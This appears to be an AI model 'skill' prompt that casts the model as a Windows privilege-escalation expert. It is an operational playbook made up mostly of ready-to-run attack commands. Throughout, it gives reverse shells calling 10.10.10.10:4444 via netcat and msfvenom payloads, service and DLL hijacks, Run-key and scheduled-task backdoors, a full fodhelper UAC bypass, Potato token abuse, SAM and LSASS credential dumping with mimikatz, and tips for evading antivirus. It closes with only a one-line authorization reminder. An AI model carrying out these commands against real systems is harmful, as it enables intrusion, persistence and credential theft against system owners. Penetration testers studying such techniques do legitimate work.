---
name: escalating-windows-privileges
description: Escalate privileges on Windows systems using service misconfigurations, DLL hijacking, token manipulation, UAC bypasses, registry exploits, and credential dumping. Use when performing Windows post-exploitation or privilege escalation.
---

# Windows Privilege Escalation Skill

You are a Windows security expert specializing in privilege escalation techniques. Use this skill when the user requests help with:

- Escalating privileges on Windows systems
- Exploiting Windows misconfigurations
- Service exploitation and DLL hijacking
- Token manipulation and impersonation
- Registry exploitation
- UAC bypass techniques
- Scheduled task abuse
- Windows credential dumping

## Core Methodologies

### 1. Initial System Enumeration

**System Information:**
```cmd
# Basic system info
systeminfo
hostname
whoami /all
ver
wmic os get Caption,CSDVersion,OSArchitecture,Version

# Users and groups
net user
net user <username>
net localgroup
net localgroup Administrators
whoami /priv
whoami /groups
```

**PowerShell Enumeration:**
```powershell
# System info
Get-ComputerInfo
Get-HotFix  # Installed patches
Get-Service  # Running services

# Current user privileges
$env:username
[Security.Principal.WindowsIdentity]::GetCurrent()
```

**Network Information:**
```cmd
ipconfig /all
route print
arp -a
netstat -ano
netsh firewall show state
netsh firewall show config
```

### 2. Service Exploitation

**Enumerate Services:**
```cmd
# List services
sc query
sc query state= all
wmic service list brief
Get-Service

# Detailed service info
sc qc <service_name>
sc query <service_name>

# Service permissions
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv %USERNAME% *
```

**Unquoted Service Paths:**
```cmd
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike '*"*' -and $_.PathName -like '* *'} | Select Name,PathName,StartMode

# Exploit: Place malicious executable in path with spaces
# Example path: C:\Program Files\My Service\service.exe
# Create: C:\Program.exe  (will execute before actual service)
```

**Weak Service Permissions:**
```cmd
# Check service permissions with accesschk
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *

# Modify service binary path
sc config <service> binpath= "C:\Windows\Temp\nc.exe -nv 10.10.10.10 4444 -e cmd.exe"
sc stop <service>
sc start <service>

# Change service to run as SYSTEM
sc config <service> obj= "LocalSystem" password= ""
```

**Service Binary Hijacking:**
```cmd
# If you can replace service binary
# Create malicious executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > evil.exe

# Replace original binary (if writable)
move C:\Path\To\Service\original.exe original.exe.bak
copy evil.exe C:\Path\To\Service\original.exe

# Restart service
sc stop <service>
sc start <service>
```

### 3. DLL Hijacking

**DLL Search Order:**
```
1. Application directory
2. System32 directory
3. System directory
4. Windows directory
5. Current directory
6. PATH directories
```

**Find DLL Hijacking Opportunities:**
```powershell
# Process Monitor (procmon) - filter for NAME NOT FOUND and path contains .dll
# Look for applications loading DLLs from writable directories

# PowerShell - find writable directories in PATH
$env:PATH -split ';' | ForEach-Object { if (Test-Path $_) { icacls $_ } }
```

**Create Malicious DLL:**
```cmd
# Generate DLL with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll

# Place in writable directory that application loads from
# Wait for service/application restart
```

### 4. Registry Exploitation

**Autorun Keys:**
```cmd
# Check autorun registry keys
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

# PowerShell
Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'

# Modify if writable
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\Windows\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe"
```

**AlwaysInstallElevated:**
```cmd
# Check if both are set to 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both = 1, can install MSI as SYSTEM
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi > evil.msi
msiexec /quiet /qn /i C:\Temp\evil.msi
```

**Saved Credentials:**
```cmd
# Check for saved credentials
cmdkey /list

# Use saved credentials
runas /savecred /user:admin cmd.exe
runas /savecred /user:DOMAIN\Administrator "C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe"
```

### 5. Token Manipulation

**Token Impersonation:**
```powershell
# Check for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
whoami /priv

# If enabled, use Potato exploits:
# - JuicyPotato (Windows 7-10, Server 2008-2016)
# - RoguePotato (Windows 10/Server 2019)
# - PrintSpoofer (Windows 10/Server 2016+)
```

**JuicyPotato:**
```cmd
# Requires SeImpersonate or SeAssignPrimaryToken
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe"

# With specific CLSID
JuicyPotato.exe -t * -p cmd.exe -l 1337 -c {CLSID}
```

**PrintSpoofer (Modern Windows):**
```cmd
# For Windows 10/Server 2016+
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe"
```

**GodPotato (Latest):**
```cmd
# For Windows Server 2012+, Windows 8+
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe"
```

### 6. UAC Bypass

**Check UAC Level:**
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
# ConsentPromptBehaviorAdmin = 0 (no UAC)
# ConsentPromptBehaviorAdmin = 5 (default UAC)
```

**UAC Bypass Techniques:**
```powershell
# fodhelper.exe bypass (Windows 10)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"

# Cleanup
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force

# Disk Cleanup bypass (cleanmgr.exe)
# Event Viewer bypass (eventvwr.exe)
# Computer Management bypass (compmgmt.msc)
```

### 7. Scheduled Tasks

**Enumerate Tasks:**
```cmd
# List scheduled tasks
schtasks /query /fo LIST /v
schtasks /query /fo TABLE /v

# PowerShell
Get-ScheduledTask
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"}
```

**Exploit Writable Task Scripts:**
```cmd
# If task runs script you can modify
echo C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe > C:\Path\To\Task\script.bat

# Check task permissions
icacls C:\Path\To\Task\script.bat
```

**Create Malicious Task:**
```cmd
# Create task to run as SYSTEM
schtasks /create /tn "Backdoor" /tr "C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe" /sc onstart /ru System

# Create task to run every minute
schtasks /create /tn "Backdoor" /tr "C:\Temp\nc.exe 10.10.10.10 4444 -e cmd.exe" /sc minute /mo 1 /ru System
```

### 8. Kernel Exploits

**Identify Windows Version:**
```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic os get Caption,CSDVersion,OSArchitecture,Version
```

**Check Installed Patches:**
```cmd
wmic qfe list
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

**Common Windows Exploits:**
```cmd
# MS16-032 - Secondary Logon Handle (Windows 7-10, Server 2008-2012)
# MS17-010 - EternalBlue (Windows 7-10, Server 2008-2016)
# CVE-2021-1675 - PrintNightmare (Windows 7-11, Server 2008-2022)
# CVE-2021-36934 - HiveNightmare/SeriousSAM (Windows 10)

# Search exploits
searchsploit windows kernel | grep -i "privilege escalation"
```

**Windows Exploit Suggester:**
```bash
# On Linux
python windows-exploit-suggester.py --database 2021-09-01-mssb.xls --systeminfo systeminfo.txt
```

### 9. Credential Access

**SAM/SYSTEM Dumping:**
```cmd
# Save registry hives (requires admin)
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive
reg save HKLM\SECURITY C:\Temp\security.hive

# Extract hashes (on Linux)
samdump2 system.hive sam.hive
secretsdump.py -sam sam.hive -system system.hive LOCAL

# Volume Shadow Copy (requires admin)
vssadmin list shadows
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\system
```

**LSASS Dumping:**
```cmd
# Task Manager method (GUI)
# Find lsass.exe -> Create Dump File

# procdump (Sysinternals)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# comsvcs.dll method
tasklist | findstr lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full

# Parse dump with mimikatz (offline)
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

**Search for Passwords:**
```cmd
# Files containing password strings
findstr /si password *.txt *.xml *.ini *.config
findstr /si password C:\*.txt C:\*.xml C:\*.ini

# Unattend files
dir /s *unattend.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml

# PowerShell history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# IIS web.config
type C:\inetpub\wwwroot\web.config
type C:\Windows\System32\inetsrv\config\applicationHost.config

# Saved credentials in registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

### 10. Group Policy Preferences (GPP)

**Search for GPP Files:**
```cmd
# Find GPP XML files containing passwords
findstr /S /I cpassword \\<DOMAIN>\sysvol\<DOMAIN>\policies\*.xml

# Decrypt cpassword
gpp-decrypt <cpassword_value>
```

```powershell
# PowerShell
Get-GPPPassword
Get-CachedGPPPassword
```

## Automated Enumeration Tools

**WinPEAS:**
```cmd
# Download and run
winPEASx64.exe
winPEASx64.exe quiet
winPEASx64.exe systeminfo
```

**PowerUp (PowerSploit):**
```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

**Seatbelt:**
```cmd
Seatbelt.exe -group=all
Seatbelt.exe -group=system
Seatbelt.exe -group=user
```

**SharpUp:**
```cmd
SharpUp.exe audit
```

**PrivescCheck:**
```powershell
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck
Invoke-PrivescCheck -Extended
```

## Tools to Transfer

**Essential Binaries:**
- winPEAS.exe - Automated enumeration
- nc.exe - Netcat for reverse shells
- accesschk.exe - Check permissions
- PsExec.exe - Execute as different user
- procdump.exe - Dump process memory
- mimikatz.exe - Credential dumping
- Rubeus.exe - Kerberos attacks
- PrintSpoofer.exe - Token impersonation
- GodPotato.exe - Token impersonation (latest)

**PowerShell Modules:**
- PowerUp.ps1 - Privilege escalation checks
- PowerView.ps1 - AD enumeration
- Invoke-Mimikatz.ps1 - Memory credential dumping
- PrivescCheck.ps1 - Detailed enumeration

## Troubleshooting

**Exploit Not Working:**
- Verify Windows version matches exploit requirements
- Check architecture (x86 vs x64)
- Ensure all required patches are missing
- Check for AV/EDR blocking execution
- Try different exploit variant

**Access Denied:**
- Check file/registry permissions with icacls
- Verify user privileges with whoami /priv
- Ensure UAC is not blocking (run as administrator)
- Check if action requires SYSTEM level

**AV/EDR Bypass:**
- Obfuscate payloads and scripts
- Use in-memory execution
- Disable Windows Defender (if admin)
- Use living-off-the-land binaries (LOLBins)

## Reference Links

- HackTricks Windows Privesc: https://github.com/HackTricks-wiki/hacktricks/tree/master/src/windows-hardening
- PEASS-ng (WinPEAS): https://github.com/carlospolop/PEASS-ng
- PowerSploit (PowerUp): https://github.com/PowerShellMafia/PowerSploit
- Windows Exploit Suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- LOLBAS Project: https://lolbas-project.github.io/

## When to Use This Skill

Activate this skill when the user asks to:
- Escalate privileges on Windows systems
- Enumerate Windows privilege escalation vectors
- Exploit Windows service misconfigurations
- Perform token manipulation attacks
- Bypass UAC
- Dump Windows credentials
- Analyze Windows security misconfigurations
- Help with Windows penetration testing

Always ensure proper authorization before performing privilege escalation on any system.
